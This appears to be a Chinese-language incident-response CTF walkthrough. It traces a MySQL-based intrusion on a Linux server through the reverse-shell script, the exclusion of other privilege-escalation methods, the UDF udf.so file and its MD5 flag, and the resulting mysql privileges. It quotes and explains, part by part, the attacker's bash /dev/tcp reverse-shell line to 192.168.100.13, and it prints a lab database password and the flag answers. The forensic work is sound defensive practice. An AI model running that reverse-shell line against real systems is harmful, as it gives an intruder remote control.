目标2：寻找反弹 Shell 的 IP（攻击者控制服务器的地址）

什么是 “反弹 Shell”？

正常情况下，是我们主动访问服务器（比如浏览器打开网站）；而 “反弹 Shell” 是服务器主动连接攻击者的电脑，把服务器的命令行权限 “反弹” 给攻击者。这样即使服务器有防火墙，只要能联网，攻击者就能偷偷控制它。

1）查看 MySQL 报错日志：

/var/log/mysql/error.log

在终端输入

攻击者可能通过 MySQL 漏洞（比如 SQL 注入）入侵，操作过程中如果出错，会记录在 MySQL 的报错日志里。这里日志里恰好记录了攻击者执行的/tmp/1.sh脚本的错误信息。

（2）查看 1.sh 脚本内容，找到反弹 IP

  • 在终端输入：

    /tmp是 Linux 的 “临时文件目录”，攻击者常在这里放临时脚本

脚本核心代码：bash -i >& /dev/tcp/192.168.100.13/777 0>&1

  • 代码逐段解释
    • bash -i：打开一个 “交互式 bash 终端”（就是我们平时用的命令行窗口，能输入命令的那种）。
    • /dev/tcp/192.168.100.13/777：Linux 里的 “特殊文件”，表示 “连接到192.168.100.13这个 IP 的777端口”（192.168.100.13就是攻击者的电脑 IP，777是攻击者提前开好的端口，用来接收反弹的 Shell）。
    • >&：“重定向符号”，把前面命令的输出（比如终端里的内容）发送到后面的地址（这里就是发送到攻击者的 IP）。
    • 0>&1：把 “输入” 也重定向到同一个地址 —— 简单说，就是 “攻击者在自己电脑输入命令，服务器执行后把结果发回去”，实现完整的远程控制。
  • 结论：攻击者用来接收反弹 Shell 的 IP 是192.168.100.13，这就是第二个 Flag。

目标3：寻找提权文件（攻击者从低权限升级到高权限的工具）

什么是 “提权”？

攻击者刚开始可能只有 “普通用户权限”（比如只能操作网站文件），但想控制整个服务器，就需要 “提权”（升级到root或mysql这类高权限）。MySQL 相关的提权是本次应急的核心。

先排除不可能的提权方式（缩小范围）

WP 里提到 4 种 MySQL 提权方法，先解释为什么排除前 3 种：

提权方法 原理简述 为什么排除？
MOF 提权 利用 Windows 的系统管理文件（.mof） 只支持Windows 系统，本次是 Linux 服务器，直接排除。
启动项提权 把恶意程序加入系统启动项 同样主要用于Windows（Linux 启动项机制不同），排除。
CVE-2016-6663 利用 MySQL 的漏洞执行恶意代码 漏洞只影响特定版本（MariaDB ≤5.5.51 等），本次环境是 MariaDB 5.5.64，不在范围内，排除。
UDF 提权 利用 MySQL 的 “自定义函数” 执行命令 只剩这一种，重点排查！

  • （1）操作 1：获取 MySQL 登录密码

    • 具体命令：cat /var/www/html/common.php
    • 代码解析：
      • common.php：几乎所有 PHP 网站的 “公共配置文件”，存放数据库连接信息（否则网站无法读取 MySQL 数据）。
      • 从文件中提取配置：$dbuser = 'root'（MySQL 账号）、$dbpass = '334cc35b3c704593'（MySQL 密码）。
    • 执行效果：终端显示文件代码，找到数据库账号密码并记录。

    （2）操作 2：登录 MySQL 数据库

    • 具体命令：mysql -uroot -p334cc35b3c704593
    • 代码解析：
      • mysql：启动 MySQL 客户端工具（用于连接 MySQL 服务器）。
      • 选项拆解：-u（指定登录账号，此处为root，MySQL 最高权限账号）、-p（后接密码，-p与密码间无空格）。
    • 执行效果：终端提示符变为mysql>，表示成功进入 MySQL 操作环境。

    （3）操作 3：查询 MySQL Plugin 目录路径

    UDF 提权的关键：找 “动态链接库文件（.so）”

    UDF 是 “MySQL 自定义函数” 的缩写 —— 正常 MySQL 有sum()、count()等自带函数，UDF 允许用户自己写函数（比如实现 “执行系统命令” 的函数）。但写 UDF 需要一个 “动态链接库文件”（Linux 下后缀是.so，Windows 下是.dll），这个文件必须放在 MySQL 指定的plugin目录里才能生效。

    • 具体命令：show variables like '%plugin%';（需在mysql>后执行，结尾带分号）
    • 代码解析：
      • show variables：MySQL 命令，用于查看所有系统变量（如路径、端口、配置参数）。
      • like '%plugin%'：模糊查询，只显示变量名包含plugin的结果（目标是找到plugin_dir，即 UDF 文件必须存放的目录）。
    • 执行效果：输出表格，其中plugin_dir的值为/usr/lib/mysql/plugin/（记录此路径）。

    （4）操作 4：退出 MySQL 并验证 UDF 文件

    • 操作 4.1 退出 MySQL：
      • 具体命令：exit;（mysql>后执行）
      • 代码解析：退出 MySQL 客户端，回到 Linux 终端（提示符恢复为root@xxx:/var/www/html#）。
    • 操作 4.2 查看 Plugin 目录文件：
      • 具体命令：ls /usr/lib/mysql/plugin/
      • 代码解析：ls是 Linux “查看目录内容” 的命令，此处用于确认plugin目录中是否存在udf.so（UDF 提权的核心动态链接库文件）。
      • 执行效果：终端显示目录文件列表，包含udf.so，验证 UDF 提权思路。

    （5）操作 5：计算 udf.so 的 MD5 值

    • 具体命令：md5sum /usr/lib/mysql/plugin/udf.so

    • 代码解析

      ：

      • md5sum：Linux 自带的 “计算文件 MD5 哈希值” 工具，可生成唯一的 32 位字符串标识文件（确保文件未被篡改且定位准确）。
      • 路径/usr/lib/mysql/plugin/udf.so：udf.so的完整路径（从步骤 3 获取）。

    • 执行效果：终端输出b1818bde4e310f3d23f1005185b973e7 /usr/lib/mysql/plugin/udf.so，前 32 位字符串即为第三个 Flag。

      四、第四步：确定攻击者获得的权限

      1. 核心目标

      通过查看进程所属用户，确认攻击者最终获得的权限（第四个 Flag）。

      2. 具体操作步骤 & 代码解析

      • 具体命令：ps -aux | grep mysql(需要在提权文件的目录里执行)
      • 代码解析：
        • ps -aux：Linux “查看系统所有进程” 的命令，-a（显示所有用户进程）、-u（显示进程所属用户）、-x（显示后台进程）。
        • | grep mysql：管道符（|）将前一命令的输出作为后一命令的输入，grep mysql筛选出含 “mysql” 关键词的进程（聚焦 MySQL 相关进程，排除无关干扰）。
      • 执行效果：终端显示 MySQL 相关进程列表，其中USER列（进程所属用户）均为mysql，说明攻击者通过提权文件获得的权限为mysql，即为第四个 Flag。
